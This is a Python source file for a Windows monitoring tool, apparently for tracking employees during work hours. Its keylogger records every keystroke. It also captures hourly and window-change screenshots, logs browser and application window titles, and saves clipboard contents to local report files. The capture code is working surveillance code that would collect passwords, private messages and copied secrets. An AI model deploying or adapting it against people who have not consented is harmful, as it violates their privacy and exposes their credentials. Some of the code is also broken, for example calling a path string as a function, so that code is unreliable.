# This .py file contains functions for 
# taking hourly screenshots, 
# Keylogging, 
# Keystrokes and word count, 
# Browser tracking 
# application tracking 
# clipboard monitoring


import time
import psutil
import win32gui
import win32process
import datetime
import os
from urllib.parse import urlparse
from pynput import keyboard
from PIL import ImageGrab
import threading
import pyperclip
import textwrap

import subprocess
import requests

from credentials  import REPORT_DIR

from write_report import write_report
#Globals


BROWSER_PROCESSES = ['chrome.exe', 'firefox.exe', 'msedge.exe', 'brave.exe']

INTERVAL = 1  # seconds between checks
hourly_screenshot_thread = None
stop_hourly_screenshots = False
WORK_START_HOUR = 9   # 9 AM
WORK_END_HOUR = 18    # 6 PM (in 24-hour format)
#for clipboard

clipboard_running = False
clipboard_data = []
clipboard_thread = None


# ==================== Keylogger ====================
class Keylogger:
    def __init__(self):
        self.keystrokes = ""

    def on_press(self, key):
        try:
            if key.char is not None:
                self.keystrokes += key.char
            else:
                self.keystrokes += f'[{key}]'
        except AttributeError:
            # fallback for keys without 'char' attribute
            self.keystrokes += f'[{key}]'


    def start_keylogger(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        return listener


    def generate_report(self):
        # Combine all keystrokes into one long string
        full_text = "".join(self.keystrokes)

        # Wrap the text to 100 characters per line
        wrapped_lines = textwrap.wrap(full_text, width=70)

        content = [
            "",  # Blank line for spacing after title divider
            "Keylogger:"
        ] + wrapped_lines  # Add the wrapped lines below the label

        write_report(
            directory=REPORT_DIR,
            base_filename="keylogger_report",
            content=content,
            title="Keylogger Report"
        )


# ==================== Keystroke Counter ====================
class KeystrokeCounter:
    def __init__(self):
        self.keystrokes = ""
        self.keystrokes_count = 0
        self.word_count = 0
        self.is_active = False

    def on_press(self, key):
        try:
            if self.is_active:
                self.keystrokes += key.char
                self.keystrokes_count += 1
        except AttributeError:
            if self.is_active:
                if key == keyboard.Key.space:
                    self.keystrokes += ' '
                    self.keystrokes_count += 1
                    self.word_count += len(self.keystrokes.split())
                elif key == keyboard.Key.enter:
                    self.keystrokes += '[ENTER]'
                    self.word_count += len(self.keystrokes.split())

    def start_keylogger(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        return listener

    def enable_counter(self):
        self.is_active = True

    def disable_counter(self):
        self.is_active = False


    def generate_report(self):
        content = [
        "",  # Adds a newline after the divider line
        f"Total Keystrokes: {self.keystrokes_count}",
        f"Total Words Typed (rough estimate): {self.word_count}"
        ]
        write_report(
        directory=REPORT_DIR,
        base_filename="keystroke_report",
        content=content,
        title="Keystroke Counter Report",
        with_timestamp=False
        )


import getpass

# ==================== Screenshot Capture ====================
class ScreenshotCapture:
    # date_folder = datetime.datetime.now().strftime("%d-%m-%Y")
    # screenshot_dir = os.path.join(REPORT_DIR, date_folder+"\\Screenshots")
    # if not os.path.exists(screenshot_dir):
    #     os.makedirs(screenshot_dir, exist_ok=True)

    def __init__(self):
        pass

    def get_screenshot_dir(self):
        current_date = datetime.datetime.now().strftime("%d-%m-%Y")
        current_user = getpass.getuser()
        screenshot_dir = os.path.join(REPORT_DIR, current_date, current_user, "Screenshots")
        os.makedirs(screenshot_dir, exist_ok=True)
        return screenshot_dir

    def take_screenshot(self, reason, title=""):
        screenshot_dir = self.get_screenshot_dir()
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_title = "".join(c for c in title if c.isalnum() or c in (' ', '_')).rstrip()
        # filename = os.path.join(ScreenshotCapture.screenshot_dir, f"{reason}{safe_title}{timestamp}.png")
        filename = os.path.join(screenshot_dir, f"{reason}{safe_title}{timestamp}.png")

        try:
            img = ImageGrab.grab()
            img.save(filename)
            print(f"[+] Screenshot saved: {filename}")
        except Exception as e:
            print(f"[!] Screenshot failed: {e}")

    def generate_report(self):
        screenshot_dir = self.get_screenshot_dir()
        total_screenshots = len(os.listdir(screenshot_dir()))
        content = f"Total screenshots taken: {total_screenshots}"
        write_report(
            directory=REPORT_DIR,
            base_filename="screenshot_report",
            content=content,
            title="Screenshot Capture Report",
            with_timestamp=False,
            mode='w'
        )

# ==================== Browser Tracking ====================
class BrowserTracking:
    def __init__(self):
        self.browsing_data = []
        self.running = True
        self.window_start_time = time.time()

    def get_browser_url(self):
        try:
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process = psutil.Process(pid)
            exe_name = process.name().lower()

            if exe_name not in BROWSER_PROCESSES:
                return None, None  # Not a browser, skip

            title = win32gui.GetWindowText(hwnd)

            # Extract possible URL
            if ' - ' in title:
                possible_url = title.split(' - ')[0]
                parsed = urlparse(possible_url)
                if parsed.scheme and parsed.netloc:
                    return possible_url, exe_name
                return possible_url, exe_name
            return title, exe_name
        except Exception:
            return None, None

    def track_browser_usage(self):
        last_url = ""
        global screenshot_capture
        while self.running:
            current_url, process_name = self.get_browser_url()
            current_time = time.time()

            if current_url and current_url != last_url:
                duration = current_time - self.window_start_time
                entry = {
                    'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    'process': process_name,
                    'url': current_url,
                    'duration': duration,
                }
                self.browsing_data.append(entry)

                if 'screenshot_capture' in globals() and screenshot_capture:
                    screenshot_capture.take_screenshot(reason="URLChange_", title=current_url)

                self.window_start_time = current_time
                last_url = current_url

            time.sleep(INTERVAL)

    def stop(self):
        self.running = False

    def generate_report(self):
        content = [
            f"Process: {entry['process']}, URL: {entry['url']}, Duration: {entry['duration']:.2f} seconds"
            for entry in self.browsing_data
        ]
        write_report(
            directory=REPORT_DIR,
            base_filename="browser_report",
            content=content,
            title="Browser Usage Report",
            with_timestamp=True,
            mode='a'
        )

# ==================== Application Tracking ====================
class ApplicationTracking:
    def __init__(self):
        self.activities = []
        self.running = True  # Add this as a variable for stopping the thread on turning off the toggle switch

    def get_active_window(self):
        try:
            hwnd = win32gui.GetForegroundWindow()
            thread_id, pid = win32process.GetWindowThreadProcessId(hwnd)
            process = psutil.Process(pid)
            window_title = win32gui.GetWindowText(hwnd)
            return process.name(), window_title
        except:
            return "Unknown", "Unknown"

    def track_applications(self):
        last_window = ""
        self.window_start_time = time.time()
        global screenshot_capture
        while self.running:  
            process_name, window_title = self.get_active_window()
            current_time = time.time()
            if window_title != last_window and last_window != "":
                duration = current_time - self.window_start_time
                entry = {
                    'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    'process': process_name,
                    'title': last_window,
                    'duration': duration,
                }
                self.activities.append(entry)
                if 'screenshot_capture' in globals() and screenshot_capture:
                    screenshot_capture.take_screenshot(reason="AppSwitch_", title=window_title)

                self.window_start_time = current_time
            last_window = window_title
            time.sleep(INTERVAL)

    def stop(self):  #For stopping the thread
        self.running = False

    
    def generate_report(self):
        content = [
            f"Process: {entry['process']}, Title: {entry['title']}, Duration: {entry['duration']:.2f} seconds"
            for entry in self.activities
        ]
        write_report(
            directory=REPORT_DIR,
            base_filename="application_report",
            content=content,
            title="Application Usage Report",
            with_timestamp=True,
            mode='w'
        )


# ==================== Hourly Screenshot ====================
def start_hourly_screenshots():
    def run():
        global stop_hourly_screenshots
        while not stop_hourly_screenshots:
            now = datetime.datetime.now()
            if WORK_START_HOUR <= now.hour < WORK_END_HOUR:
                screenshot_capture.take_screenshot(reason="hourly_", title="auto")
            time.sleep(3600)

    global hourly_screenshot_thread
    stop_hourly_screenshots = False
    hourly_screenshot_thread = threading.Thread(target=run, daemon=True)
    hourly_screenshot_thread.start()

def stop_hourly_screenshot_thread():
    global stop_hourly_screenshots
    stop_hourly_screenshots = True


# ==================== Monitor Clipboard ==========================

def safe_paste(retries=5, delay=0.2): #retry to access clipboard
    for _ in range(retries):
        try:
            return pyperclip.paste()
        except Exception as e:
            time.sleep(delay)
    raise RuntimeError("Clipboard access failed after multiple retries.")

def monitor_clipboard():
    global clipboard_running
    last_clipboard_content = ""
    
    while clipboard_running:
        try:
            current_clipboard_content = safe_paste()
            if current_clipboard_content != last_clipboard_content:
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                clipboard_data.append({
                    'timestamp': timestamp,
                    'content': current_clipboard_content
                })
                last_clipboard_content = current_clipboard_content
        except Exception as e:
            print(f"Error detecting clipboard content: {e}")
        time.sleep(1)


def generate_clipboard_report():
    if not clipboard_data:
        print("No clipboard data to report.")
        return

    content = [f"Content: {entry['content']}" for entry in clipboard_data]
    write_report(
        directory=REPORT_DIR,
        base_filename="clipboard_report",
        content=content,
        title="Clipboard Activity Report"
    )



# ==================== Enable/Disable Functions ====================
def enable_keylogger():
    print("Enabling Keylogger")
    global keylogger
    keylogger = Keylogger()
    keylogger.start_keylogger()
    print("Keylogger Enabled")

def disable_keylogger():
    print("Disabling Keylogger")
    global keylogger
    keylogger.generate_report()
    print("Keylogger report generated.")
    keylogger = None
    print("Keylogger value has been reset")

def generate_keylogger_report():
    global keylogger
    keylogger.generate_report()
    print("Keylogger report generated.")

def enable_keystroke_counter():
    global keystroke_counter
    keystroke_counter = KeystrokeCounter()
    keystroke_counter.enable_counter()
    keystroke_counter.start_keylogger()

def disable_keystroke_counter():
    global keystroke_counter
    keystroke_counter.generate_report()
    print("Keystroke report generated.")
    keystroke_counter = None

def generate_keystroke_counter_report():
    global keystroke_counter
    keystroke_counter.generate_report()
    print("Keystroke report generated.")

def enable_screenshot_capture():
    global screenshot_capture
    screenshot_capture = ScreenshotCapture()
    start_hourly_screenshots()

def disable_screenshot_capture():
    global screenshot_capture
    stop_hourly_screenshot_thread()
    screenshot_capture.generate_report()
    print("Screenshot report generated.")
    screenshot_capture = None

# def generate_screenshot_capture_report():
#     global screenshot_capture
#     screenshot_capture.generate_report()
#     print("Screenshot report generated.")
def generate_screenshot_capture_report():
    global screenshot_capture
    if 'screenshot_capture' in globals() and screenshot_capture:
        screenshot_capture.generate_report()
        print("Screenshot report generated.")
    else:
        print("[!] Screenshot capture is not enabled. No report to generate.")


def enable_browser_tracking():
    global browser_tracking
    browser_tracking = BrowserTracking()
    threading.Thread(target=browser_tracking.track_browser_usage, daemon=True).start()

def disable_browser_tracking():
    global browser_tracking
    if browser_tracking:
        browser_tracking.stop()
        browser_tracking.generate_report()
        print("Browser usage report generated.")
        browser_tracking = None

# browser_tracking = None

# def enable_browser_tracking():
#     global browser_tracking
#     launch_browser(CHROME_CMD)
#     launch_browser(EDGE_CMD)
#     browser_tracking = ChromiumBrowserTracking(interval=15)
#     browser_tracking.start()
#     print("[*] Chromium browser tracking started.")

# def disable_browser_tracking():
#     global browser_tracking
#     if browser_tracking:
#         browser_tracking.stop()
#         browser_tracking.generate_report()
#         print("[*] Chromium browser tracking stopped and report generated.")
#         browser_tracking = None

def generate_browser_tracking_report():
    global browser_tracking
    browser_tracking.generate_report()
    print("Browser usage report generated.") 

def enable_application_tracking():
    global app_tracking
    app_tracking = ApplicationTracking()
    threading.Thread(target=app_tracking.track_applications, daemon=True).start()

def disable_application_tracking():
    global app_tracking
    if app_tracking:
        app_tracking.stop()
        app_tracking.generate_report()
        print("Application usage report generated.")
        app_tracking = None

def generate_application_tracking_report():
    global app_tracking
    app_tracking.generate_report()
    print("Application usage report generated.")

def enable_clipboard_monitoring():
    global clipboard_running, clipboard_thread
    if clipboard_running:
        print("Clipboard monitoring already running.")
        return
    clipboard_running = True
    clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
    clipboard_thread.start()
    print("[+] Clipboard monitoring started.")

def disable_clipboard_monitoring():
    global clipboard_running, clipboard_thread
    if not clipboard_running:
        print("Clipboard monitoring not running.")
        return
    clipboard_running = False
    clipboard_thread.join()  # Wait for thread to fully exit
    generate_clipboard_report()
    print("[-] Clipboard monitoring stopped.")


#if __name__ == "__main__":
#    # Simulate your schedule function calling enable/disable
#    print("Simulating schedule function...")
#    enable_screenshot_capture()
#    time.sleep(20)  # Wait for the first capture to complete and observe
#    disable_screenshot_capture()
